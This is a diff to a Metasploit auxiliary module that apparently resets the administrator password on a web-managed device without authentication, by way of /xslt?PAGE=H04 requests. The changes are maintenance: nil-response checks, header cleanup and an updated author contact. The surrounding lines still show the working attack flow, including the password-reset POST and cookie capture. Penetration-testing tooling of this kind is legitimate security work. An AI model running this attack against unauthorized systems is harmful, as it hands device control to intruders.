@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -24,10 +20,9 @@ class Metasploit3 < Msf::Auxiliary
 				configuration changes (such as resetting the password) as administrators.
 			},
 			'License'        => MSF_LICENSE,
-			'Version'        => "$Revision$",
 			'Author'         =>
 				[
-					'hkm',              #Initial discovery, poc
+					'hkm [at] hakim.ws',              #Initial discovery, poc
 					'Travis Phillips',  #Msf module
 				],
 			'References'     =>
@@ -41,7 +36,6 @@ class Metasploit3 < Msf::Auxiliary
 
 			register_options(
 				[
-					Opt::RPORT(80),
 					OptString.new('PASSWORD', [ true, 'The password to reset to', 'admin'])
 				], self.class)
 	end
@@ -54,6 +48,11 @@ class Metasploit3 < Msf::Auxiliary
 			'method'  => 'GET',
 			'uri'     => '/xslt?PAGE=A07',
 		}, 25)
+
+		if not res
+			print_error("No response from server")
+			return
+		end
 
 		#check to see if we get HTTP OK
 		if (res.code == 200)
@@ -115,7 +114,7 @@ class Metasploit3 < Msf::Auxiliary
 			'uri'     => '/xslt?PAGE=H04',
 		}, 25)
 
-		if ( res.code == 200 and res.body.match(/<title>System Setup - Password<\/title>/i))
+		if ( res and res.code == 200 and res.body.match(/<title>System Setup - Password<\/title>/i))
 			print_status("Found password reset page. Attempting to reset admin password to #{datastore['PASSWORD']}")
 
 			data  = 'PAGE=H04_POST'
@@ -132,7 +131,7 @@ class Metasploit3 < Msf::Auxiliary
 				'data'    => data,
 			}, 25)
 
-			if res.code == 200
+			if res and res.code == 200
 				if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/(.*); path=\//))
 					cookie= $1
 					print_status("Got cookie #{cookie}. Password reset was successful!\n")
